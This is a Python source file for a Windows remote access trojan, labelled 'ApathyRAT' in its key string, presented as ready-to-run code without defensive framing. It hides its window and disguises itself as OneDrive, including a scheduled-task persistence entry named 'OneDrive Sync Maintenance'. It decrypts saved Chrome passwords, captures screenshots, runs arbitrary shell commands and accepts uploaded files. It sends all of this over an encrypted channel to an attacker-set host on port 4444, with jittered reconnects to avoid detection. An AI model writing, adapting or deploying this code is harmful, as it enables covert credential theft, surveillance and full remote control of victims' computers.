#!/usr/bin/env python3
import socket, subprocess, os, sys, time, json, base64, ctypes, io, struct, shutil, sqlite3, tempfile, random
from ctypes import wintypes

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    from cryptography.fernet import Fernet
except ImportError:
    sys.exit(1)

HOST = "CHANGE_ME_IP"
PORT = 4444
KEY = b"ApathyRAT_AES_Key_32bytes_long!!"[:32]
fernet = Fernet(base64.urlsafe_b64encode(KEY.ljust(32, b"0")[:32]))

CREATE_NO_WINDOW = 0x08000000

def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False

def hide():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass
    try:
        ctypes.windll.kernel32.CreateMutexW(None, False, "Local\\OneDriveSyncMutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            os._exit(0)
    except Exception:
        pass

def get_exe_path():
    if getattr(sys, "frozen", False):
        return sys.executable
    return os.path.abspath(sys.argv[0])

def persist_task():
    try:
        exe = get_exe_path()
        task_name = "OneDrive Sync Maintenance"
        cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{exe}\\"" /sc onlogon /rl limited /f'
        subprocess.Popen(cmd, shell=True, creationflags=CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi_unprotect(data: bytes) -> bytes:
    if not data:
        return b""
    blob_in = DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_char)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    ):
        result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return result
    return b""

def dump_chrome_logins():
    lines = []
    login_db = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(login_db):
        return "no chrome"
    try:
        tmp = tempfile.mktemp(suffix=".db")
        shutil.copy2(login_db, tmp)
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc_pwd in cur.fetchall():
            dec = dpapi_unprotect(enc_pwd)
            if dec:
                lines.append(f"{url} | {user} | {dec.decode('utf-8', 'ignore')}")
        con.close()
        os.remove(tmp)
    except Exception as e:
        lines.append(f"error: {e}")
    return "\n".join(lines) if lines else "empty"

def take_screenshot():
    if ImageGrab is None:
        return b""
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=28)
        return base64.b64encode(buf.getvalue())
    except Exception:
        return b""

def exec_cmd(command: str) -> str:
    try:
        proc = subprocess.Popen(
            ["cmd.exe", "/c", command],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            creationflags=CREATE_NO_WINDOW,
        )
        out, err = proc.communicate(timeout=30)
        return (out + err).decode("utf-8", "ignore") or "[empty]"
    except Exception as e:
        return str(e)

def send_encrypted(sock, data: bytes):
    encrypted = fernet.encrypt(data)
    sock.sendall(struct.pack(">I", len(encrypted)) + encrypted)

def recv_encrypted(sock):
    try:
        header = sock.recv(4)
        if len(header) < 4:
            return None
        length = struct.unpack(">I", header)[0]
        payload = b""
        while len(payload) < length:
            chunk = sock.recv(length - len(payload))
            if not chunk:
                return None
            payload += chunk
        return fernet.decrypt(payload)
    except Exception:
        return None

def handle(sock):
    last_ping = time.time()
    while True:
        if time.time() - last_ping > random.randint(18, 32):
            try:
                send_encrypted(sock, b"ping")
                if recv_encrypted(sock) != b"pong":
                    break
                last_ping = time.time()
            except Exception:
                break

        raw = recv_encrypted(sock)
        if not raw:
            time.sleep(1)
            continue
        cmd = raw.decode("utf-8", "ignore").strip()

        if cmd == "ping":
            send_encrypted(sock, b"pong")
        elif cmd == "info":
            info = {
                "u": os.getenv("USERNAME", "?"),
                "h": os.getenv("COMPUTERNAME", "?"),
                "a": is_admin(),
                "p": os.getpid(),
            }
            send_encrypted(sock, json.dumps(info).encode())
        elif cmd == "shot":
            send_encrypted(sock, take_screenshot())
        elif cmd == "tokens":
            send_encrypted(sock, dump_chrome_logins().encode())
        elif cmd == "persist":
            send_encrypted(sock, b"ok" if persist_task() else b"fail")
        elif cmd.startswith("sh:"):
            send_encrypted(sock, exec_cmd(cmd[3:]).encode())
        elif cmd.startswith("up:"):
            try:
                name, b64data = cmd[3:].split("|", 1)
                dest = os.path.join(os.environ.get("TEMP", "."), name)
                with open(dest, "wb") as f:
                    f.write(base64.b64decode(b64data))
                send_encrypted(sock, dest.encode())
            except Exception as e:
                send_encrypted(sock, str(e).encode())
        elif cmd.startswith("ex:"):
            try:
                subprocess.Popen(cmd[3:], creationflags=CREATE_NO_WINDOW, shell=True)
                send_encrypted(sock, b"started")
            except Exception as e:
                send_encrypted(sock, str(e).encode())
        else:
            send_encrypted(sock, b"unknown")

def connect_loop():
    time.sleep(random.randint(30, 180))
    while True:
        try:
            sock = socket.create_connection((HOST, PORT), timeout=12)
            hello = json.dumps({
                "u": os.getenv("USERNAME", "?"),
                "h": os.getenv("COMPUTERNAME", "?"),
                "a": is_admin(),
            })
            send_encrypted(sock, hello.encode())
            return sock
        except Exception:
            time.sleep(random.randint(8, 20))

if __name__ == "__main__":
    hide()
    while True:
        try:
            s = connect_loop()
            handle(s)
        except Exception:
            pass
        time.sleep(random.randint(10, 25))
